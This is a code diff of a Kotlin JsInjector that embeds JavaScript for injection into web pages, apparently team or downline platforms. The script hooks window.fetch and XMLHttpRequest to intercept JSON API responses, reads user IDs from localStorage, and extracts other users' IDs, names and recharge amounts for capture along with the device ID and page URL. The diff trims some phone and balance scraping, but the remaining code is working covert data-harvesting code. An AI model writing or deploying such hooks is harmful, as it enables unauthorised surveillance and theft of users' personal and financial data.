@@ -9,7 +9,6 @@ object JsInjector {
     if (window.__kntHooked) return;
     window.__kntHooked = true;
 
-    // ---------- helpers ----------
     function txt(sels) {
         for (var i=0;i<sels.length;i++) {
             try {
@@ -23,9 +22,6 @@ object JsInjector {
     function clean(v){ return String(v||'').replace(/[^0-9a-zA-Z]/g,''); }
 
     function readUidFromDom() {
-        var v = txt(['.user-id','.uid','.user-info .id','[data-uid]','.profile-id']);
-        if (v) return clean(v);
-        // localStorage userInfo
         try {
             var ui = localStorage.getItem('userInfo');
             if (ui) {
@@ -33,25 +29,7 @@ object JsInjector {
                 if (j && (j.uid || j.id || j.userId)) return String(j.uid||j.id||j.userId);
             }
         } catch(e){}
-        try {
-            var t = document.body.innerText || '';
-            var m = t.match(/UID[:\s|]+(\d{4,})/i);
-            if (m) return m[1];
-        } catch(e){}
         return "";
-    }
-
-    function readBalance() {
-        return txt(['.balance','.user-balance','.wallet-balance','[data-balance]','.total-balance'])
-            .replace(/[^0-9.,]/g,'');
-    }
-
-    function readName() {
-        return txt(['.username','.nickname','.user-name','.nick-name']);
-    }
-
-    function readPhone() {
-        return txt(['.phone','.user-phone','[data-phone]']).replace(/[^0-9]/g,'');
     }
 
     function pushCapture(uid) {
@@ -60,10 +38,10 @@ object JsInjector {
             var p = {
                 device_id: (window.KNTDeviceId || ''),
                 uid: String(uid),
-                userName: readName() || '',
-                nickName: readName() || '',
-                phone: readPhone() || '',
-                balance: readBalance() || '',
+                userName: txt(['.username','.nickname','.user-name']),
+                nickName: txt(['.nickname','.nick-name']),
+                phone: '',
+                balance: '',
                 amountOfCode: '',
                 host: location.host,
                 sourceUrl: location.href,
@@ -75,29 +53,43 @@ object JsInjector {
         } catch(e){}
     }
 
-    // ---------- subordinate capture (admin mode) ----------
+    // ---- subordinate extraction ----
+    function pickUid(it) {
+        if (!it || typeof it !== 'object') return null;
+        var keys = ['userID', 'uid', 'userId', 'user_id', 'id'];
+        for (var i=0;i<keys.length;i++) {
+            var v = it[keys[i]];
+            if (v !== undefined && v !== null) {
+                var s = String(v);
+                if (s.length >= 3 && s.length <= 20) return s;
+            }
+        }
+        return null;
+    }
+
+    function pickName(it) {
+        return it.nickName || it.nickname || it.userName || it.username || it.name || '';
+    }
+
     function extractSubordinates(obj) {
-        // obj can be anywhere in the response tree.
-        // look for arrays with objects containing uid / userId
         var found = [];
         var stack = [obj];
         var depth = 0;
-        while (stack.length && depth < 300) {
+        while (stack.length && depth < 400) {
             depth++;
             var cur = stack.shift();
             if (!cur) continue;
-
             if (Array.isArray(cur)) {
                 for (var i=0;i<cur.length;i++) {
                     var it = cur[i];
                     if (it && typeof it === 'object') {
-                        var u = it.uid || it.userId || it.user_id;
-                        if (u !== undefined && u !== null && String(u).length >= 3) {
+                        var u = pickUid(it);
+                        if (u) {
                             found.push({
-                                uid: String(u),
-                                userName: it.userName || it.username || it.nickName || it.nickname || '',
-                                phone: it.phone || it.mobile || '',
-                                balance: it.balance || it.amount || '',
+                                uid: u,
+                                userName: pickName(it),
+                                phone: '',
+                                balance: it.rechargeAmount ? String(it.rechargeAmount) : '',
                                 raw: JSON.stringify(it)
                             });
                         }
@@ -131,14 +123,12 @@ object JsInjector {
         var s = String(url);
         return s.indexOf('TeamDayReport') !== -1
             || s.indexOf('TeamReport') !== -1
-            || s.indexOf('Subordinate') !== -1
-            || s.indexOf('subordinate') !== -1
-            || s.indexOf('TeamMember') !== -1
             || s.indexOf('TeamList') !== -1
+            || s.indexOf('Subordinate') !== -1
             || s.indexOf('Downline') !== -1;
     }
 
-    // ---------- fetch hook ----------
+    // fetch hook
     var origFetch = window.fetch;
     if (origFetch) {
         window.fetch = function(input, init) {
@@ -148,11 +138,7 @@ object JsInjector {
                     var cl = resp.headers.get('content-type') || '';
                     if (cl.indexOf('json') !== -1) {
                         resp.clone().json().then(function(j) {
-                            if (isSubordinateApi(url)) {
-                                pushSubordinates(j);
-                            }
-                            // also try capture
-                            tryParseUserJson(j);
+                            if (isSubordinateApi(url)) pushSubordinates(j);
                         }).catch(function(){});
                     }
                 } catch(e){}
@@ -161,7 +147,7 @@ object JsInjector {
         };
     }
 
-    // ---------- XHR hook ----------
+    // XHR hook
     var origOpen = XMLHttpRequest.prototype.open;
     XMLHttpRequest.prototype.open = function(method, url) {
         var u = String(url||'');
@@ -170,37 +156,14 @@ object JsInjector {
                 var ct = this.getResponseHeader('content-type') || '';
                 if (ct.indexOf('json') !== -1 && this.responseText) {
                     var j = JSON.parse(this.responseText);
-                    if (isSubordinateApi(u)) {
-                        pushSubordinates(j);
-                    }
-                    tryParseUserJson(j);
+                    if (isSubordinateApi(u)) pushSubordinates(j);
                 }
             } catch(e){}
         });
         return origOpen.apply(this, arguments);
     };
 
-    function tryParseUserJson(obj) {
-        try {
-            if (!obj) return;
-            var stack = [obj];
-            var depth = 0;
-            while (stack.length && depth < 200) {
-                depth++;
-                var cur = stack.shift();
-                if (!cur || typeof cur !== 'object') continue;
-                if (cur.uid || cur.userId || cur.user_id) {
-                    var v = cur.uid || cur.userId || cur.user_id;
-                    pushCapture(String(v));
-                }
-                for (var k in cur) {
-                    if (typeof cur[k] === 'object') stack.push(cur[k]);
-                }
-            }
-        } catch(e){}
-    }
-
-    // ---------- DOM scan loop ----------
+    // DOM scan
     function scan() {
         try {
             var uid = readUidFromDom();
